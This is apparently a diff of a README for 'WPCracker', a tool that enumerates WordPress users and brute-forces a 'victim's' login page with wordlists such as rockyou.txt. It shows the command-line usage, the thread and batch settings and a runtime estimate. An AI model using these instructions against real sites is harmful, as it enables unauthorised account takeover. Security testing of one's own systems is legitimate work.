@@ -8,26 +8,38 @@ The tool makes it possible to adjust the number of threads as well as how large 
 
 It takes about two days to go through the rockyou.txt (14,341,564 unique passwords) dictionary on my hardware when using the program's presets for the number of threads (12) and the size of the batches (1000).
 
-## How to use:
+# Using:
 
-### Using program's presets
-```Bach
-.\WPCracker.exe -u <Url to victim's wp-login.php> -p <Path to wordlist> -n <Username>
+## User Enumeration
+```Bash
+.\WPCracker.exe --enum -u <Url to victim's wp-login.php>
 ```
 #### OR JUST
-```Bach
-.\WPCracker.exe
+```Bash
+.\WPCracker.exe --enum
+```
+In this case, the program only requests the required information
+
+## Brute Force
+
+### Using program's presets
+```Bash
+.\WPCracker.exe --brute -u <Url to victim's WordPress page> -p <Path to wordlist> -n <Username>
+```
+#### OR JUST
+```Bash
+.\WPCracker.exe --brute
 ```
 In this case, the program only requests the required information
 
 ### Using with custom settings
-```Bach
-.\WPCracker.exe -u <Url to victim's wp-login.php> -p <Path to wordlist> -n <Username> -t <Max threads> -c <Batch maximum size>
+```Bash
+.\WPCracker.exe --brute -u <Url to victim's WordPress page> -p <Path to wordlist> -n <Username> -t <Max threads> -c <Batch maximum size>
 ```
 
-### List of arguments
-```Bach
-.\WPCracker.exe -?
+### Get help
+```Bash
+.\WPCracker.exe --brute -?
 ```
 
 # This is for ethical use only :)
